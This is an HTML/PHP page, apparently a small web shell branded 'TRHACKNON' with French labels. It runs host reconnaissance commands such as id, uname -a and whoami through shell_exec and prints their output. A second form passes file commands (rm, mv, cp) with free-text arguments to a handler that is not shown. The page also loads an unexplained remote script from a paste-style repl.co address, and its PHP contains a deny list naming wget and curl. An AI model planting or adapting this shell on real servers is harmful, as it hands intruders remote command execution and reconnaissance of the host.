<!DOCTYPE html>
<html>
<head>  <link rel="stylesheet" href="scsh.css"><link rel="stylesheet" href="closty.css"><script type="text/javascript" src="https://hastebytrhacknon.trhacknon.repl.co/raw/ozivuhesecaj"></script>
<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'><style src="scsh.js"></style>
	<h1>Commande Shell</h1>	<script src="clock.js"></script>
  <script src="weath.js"></script>
<br><br><br>
	<div id="logo-container">
	</div><div id="Clock" align="center" style="font-size:58px;font-family:'iceland';color:red;"></div><hr width="100%"><br><br><font face=Orbitron color=red size=12><center>TRHACKNON<br></center></font><br></b></div>
		<br><br>
	<title>Commandes basiques</title>
</head>
<body>
	<h1>Commandes basiques</h1>
	<form action="cons.php" method="GET">
		<input type="submit" name="cmd" value="id"><br>
		<input type="submit" name="cmd" value="uname -a"><br>
		<input type="submit" name="cmd" value="ls"><br>
		<input type="submit" name="cmd" value="whoami"><br>
		<input type="submit" name="cmd" value="hostname"><br>
	</form>

<form action="cons.php" method="GET">
	<label for="commande">Commande :</label>
	<select name="commande" id="commande">
		<option value="ls">ls</option>
		<option value="cd">cd</option>
		<option value="mkdir">mkdir</option>
		<option value="rm">rm</option>
		<option value="cp">cp</option>
		<option value="mv">mv</option>
	</select><br><br>
<label for="arguments">Arguments :</label>
<input type="text" name="arguments" id="arguments"><br><br>

<input type="submit" value="Exécuter">
</form>


</body>
</html>
<?php
// Interdire les commandes non autorisées
$forbidden_cmds = array('wget', 'curl', 'rm', 'cat', 'mv', 'cp', 'touch');
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';
if (in_array($cmd, $forbidden_cmds)) {
	die("Commande interdite!");
}

// Limiter les fichiers accessibles au dossier courant
chdir(__DIR__);
ini_set('open_basedir', __DIR__);

// Vérifier si une commande a été soumise
if (isset($_GET['cmd'])) {
	// Vérifier si la commande est autorisée
	$cmd = $_GET['cmd'];
	if (in_array($cmd, array('id', 'uname -a', 'ls', 'whoami', 'hostname'))) {
		// Exécuter la commande et afficher la réponse
		echo "<pre>" . shell_exec($cmd) . "</pre>";
	} else {
		echo "Commande non autorisée!";
	}
}
?>
